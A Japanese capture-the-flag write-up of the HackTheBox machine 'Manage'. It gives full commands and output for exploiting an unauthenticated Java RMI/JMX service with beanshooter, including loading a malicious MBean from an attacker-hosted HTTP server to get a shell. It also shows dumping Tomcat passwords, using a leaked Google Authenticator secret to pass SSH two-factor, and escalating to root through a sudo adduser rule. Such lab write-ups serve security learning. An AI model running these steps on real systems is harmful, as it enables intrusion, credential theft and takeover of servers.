---
title: 'Manage'
description: 'HackTheBox MachineのWriteupです。'
pubDate: 2026-02-17T19:35:00+09:00
category: 'HTB'
tags: ['HTB Machine', 'Writeup', 'Linux', 'Java RMI:JMX', 'Google Authenticator']
---

# Manage - HackTheBox

## 初期侵入
### ポート調査
```bash
nmap 10.129.234.57 -Pn
PORT     STATE SERVICE
22/tcp   open  ssh
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy

nmap 10.129.234.57 -Pn -p 2222,8080 -A
PORT     STATE SERVICE  VERSION
2222/tcp open  java-rmi Java RMI
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:36301
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
8080/tcp open  http     Apache Tomcat 10.1.19
|_http-title: Apache Tomcat/10.1.19
|_http-favicon: Apache Tomcat
```

### Java RMI/JMXとは
**RMI**  
異なるコンピューター上にあるオブジェクトのメソッドを呼び出す仕組み

**JMX**  
Javaアプリケーションの監視・管理フレームワーク

本来の使い方：  
管理者 --RMI--> JMX --> Tomcatの状態確認

今回の悪用：  
攻撃者 --RMI--> JMX --> MLet --> TonkaBean追加 --> RCE

#### RMG実行
```bash
$ sudo apt install maven
$ git clone https://github.com/qtc-de/remote-method-guesser.git
$ mvn package
rmg-5.1.0-jar-with-dependencies.jar
```
```bash
$ java rmg-5.1.0-jar-with-dependencies.jar 10.129.234.57 2222
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: 127.0.1.1:36301  CSF: RMISocketFactory  ObjID: [33d4e658:19c69a6f8ec:-7fff, -1976467279921944912]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- The remote server does not expose any codebases.
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Server complained that object cannot be casted to java.lang.String.
[+] 	  --> The type java.lang.String is unmarshalled via readString().
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- RMI registry uses readString() for unmarshalling java.lang.String.
[+] 	  This prevents useCodebaseOnly enumeration from remote.
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Registry rejected unbind call cause it was not sent from localhost.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Caught Exception containing 'no security manager' during RMI call.
[+] 	  --> The server does not use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enumeration:
[+]
[+] 	- RMI registry uses readString() for unmarshalling java.lang.String.
[+] 	  This prevents JEP 290 bypass enumeration from remote.
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught NoSuchObjectException during activate call (activator not present).
[+] 	  Configuration Status: Current Default
```

#### BeanShooter実行
BeanShooterは簡単に、ターゲットのRMI/JMXサーバに悪意のあるオブジェクト(TonkaBean)を新規登録して、そのオブジェクトを悪用するイメージ  
```bash
git clone https://github.com/qtc-de/beanshooter
mvn package
beanshooter-4.1.0-jar-with-dependencies.jar
```
調査
```bash
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.129.234.57 2222
[+] Checking available bound names:
[+]
[+] 	* jmxrmi (JMX endpoint: 127.0.1.1:36301)
[+]
[+] Checking for unauthorized access:
[+]
[+] 	- Remote MBean server does not require authentication.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] Checking pre-auth deserialization behavior:
[+]
[+] 	- Remote MBeanServer rejected the payload class.
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] Checking available MBeans:
[+]
[+] 	- 252 MBeans are currently registred on the MBean server.
[+] 	  Listing 230 non default MBeans:
[+] 	  - org.apache.tomcat.util.modeler.BaseModelMBean (Catalina:type=Loader,host=localhost,context=/host-manager)
~~~
[+] Enumerating tomcat users:
[+]
[+] 	- Listing 2 tomcat users:
[+]
[+] 		----------------------------------------
[+] 		Username:  manager
[+] 		Password:  fhErvo2r9wuTEYiYgt
[+] 		Roles:
[+] 			   Users:type=Role,rolename="manage-gui",database=UserDatabase
[+]
[+] 		----------------------------------------
[+] 		Username:  admin
[+] 		Password:  onyRPCkaG4iX72BrRtKgbszd
[+] 		Roles:
[+] 			   Users:type=Role,rolename="role1",database=UserDatabase
```
オブジェクト登録
```bash
# tty01
$ cat mlet.html
<html>
<mlet code="de.qtc.beanshooter.tonkabean.TonkaBean"
  archive="tonka-bean-4.1.0-jar-with-dependencies.jar"
  name="MLetTonkaBean:name=TonkaBean,id=1"
  codebase="http://10.10.14.99:8000">
</mlet>
</html>

$ ls -la
total 36
drwxrwxr-x 6 kali kali 4096 Feb 17 15:32 .
drwxrwxr-x 4 kali kali 4096 Feb 17 15:09 ..
drwxrwxr-x 2 kali kali 4096 Feb 17 15:09 archive-tmp
drwxrwxr-x 3 kali kali 4096 Feb 17 15:09 classes
drwxrwxr-x 3 kali kali 4096 Feb 17 15:09 generated-sources
drwxrwxr-x 3 kali kali 4096 Feb 17 15:09 maven-status
-rw-rw-r-- 1 kali kali  223 Feb 17 15:32 mlet.html
-rw-rw-r-- 1 kali kali 4222 Feb 17 15:09 tonka-bean-4.1.0-jar-with-dependencies.jar

$ python3 -m http.server 8000

# tty02
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka deploy 10.129.234.57 2222 --stager-url http://10.10.14.99:8000/mlet.html --no-stager
[+] Starting MBean deployment.
[+]
[+] 	Deplyoing MBean: TonkaBean
[+]
[+] 		MBean class is not known by the server.
[+] 		Loading MBean from http://10.10.14.99:8000/mlet.html
[+]
[+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed.
```
RCE
```bash
$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell 10.129.234.57 2222

[tomcat@10.129.234.57 /]$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

[tomcat@10.129.234.57 /]$ cat /etc/passwd
tomcat:x:1001:1001::/opt/tomcat:/bin/false

[tomcat@10.129.234.57 /opt/tomcat]$ ls
bin
BUILDING.txt
conf
CONTRIBUTING.md
lib
LICENSE
logs
NOTICE
README.md
RELEASE-NOTES
RUNNING.txt
temp
user.txt
webapps
work
```

### SSHアクセス
```bash
$ ssh useradmin@10.129.234.57
useradmin@10.129.234.57: Permission denied (publickey).

[tomcat@10.129.234.57 /home/useradmin]$ ls -la
total 36
drwxr-xr-x 5 useradmin useradmin 4096 Jun 26  2025 .
drwxr-xr-x 4 root      root      4096 Jun 21  2024 ..
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 backups
lrwxrwxrwx 1 useradmin useradmin    9 Jun 21  2024 .bash_history -> /dev/null
-rw-r--r-- 1 useradmin useradmin  220 Jun 21  2024 .bash_logout
-rw-r--r-- 1 useradmin useradmin 3771 Jun 21  2024 .bashrc
drwx------ 2 useradmin useradmin 4096 Jun 21  2024 .cache
-r-------- 1 useradmin useradmin  200 Jun 21  2024 .google_authenticator
-rw-r--r-- 1 useradmin useradmin  807 Jun 21  2024 .profile
drwxrwxr-x 2 useradmin useradmin 4096 Jun 21  2024 .ssh
```

`backups`このバックアップファイルをローカルにダウンロードする
```bash
$ tar -xzf backup.tar.gz
$ ls -la
total 36
drwxr-xr-x 4 kali kali    4096 Jun 22  2024 .
drwxr-xr-x 5 kali dialout 4096 Feb 17 16:21 ..
-rw-rw-r-- 1 kali kali    3088 Jun 22  2024 backup.tar.gz
lrwxrwxrwx 1 kali kali       9 Jun 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 kali kali     220 Jun 22  2024 .bash_logout
-rw-r--r-- 1 kali kali    3771 Jun 22  2024 .bashrc
drwx------ 2 kali kali    4096 Jun 22  2024 .cache
-r-------- 1 kali kali     200 Jun 22  2024 .google_authenticator
-rw-r--r-- 1 kali kali     807 Jun 22  2024 .profile
drwxrwxr-x 2 kali kali    4096 Jun 22  2024 .ssh
```
```bash
$ ssh -i .ssh/id_ed25519  useradmin@10.129.234.57
(useradmin@10.129.234.57) Verification code:
```
```bash
$ cat .google_authenticator
CLSSSMHYGLENX5HAIFBQ6L35UM # シークレットキー(Base32)
" RATE_LIMIT 3 30 1718988529
" WINDOW_SIZE 3
" DISALLOW_REUSE 57299617
" TOTP_AUTH
99852083
20312647
73235136
92971994
86175591
98991823
54032641
69267218
76839253
56800775

$ oathtool --totp --base32 "CLSSSMHYGLENX5HAIFBQ6L35UM"
699897
```
```bash
ssh -i .ssh/id_ed25519  useradmin@10.129.234.57
(useradmin@10.129.234.57) Verification code: # 699897

useradmin@manage:~$ id
uid=1002(useradmin) gid=1002(useradmin) groups=1002(useradmin)
```

## 権限昇格
```bash
useradmin@manage:~$ sudo -l
Matching Defaults entries for useradmin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User useradmin may run the following commands on manage:
    (ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```
admin は過去に sudo 相当の特権グループとして存在していた
```bash
useradmin@manage:~$ sudo adduser admin
Adding user `admin' ...
Adding new group `admin' (1004) ...
Adding new user `admin' (1004) with group `admin' ...
Creating home directory `/home/admin' ...
Copying files from `/etc/skel' ...
New password:
Retype new password:
passwd: password updated successfully
Changing the user information for admin
Enter the new value, or press ENTER for the default
	Full Name []:
	Room Number []:
	Work Phone []:
	Home Phone []:
	Other []:
Is the information correct? [Y/n]

useradmin@manage:/home/useradmin$ su admin
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@manage:/home/useradmin$ sudo -l
[sudo] password for admin:
Matching Defaults entries for admin on manage:
    env_reset, timestamp_timeout=1440, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on manage:
    (ALL) ALL

admin@manage:/home/useradmin$ sudo ls /root
root.txt  snap
```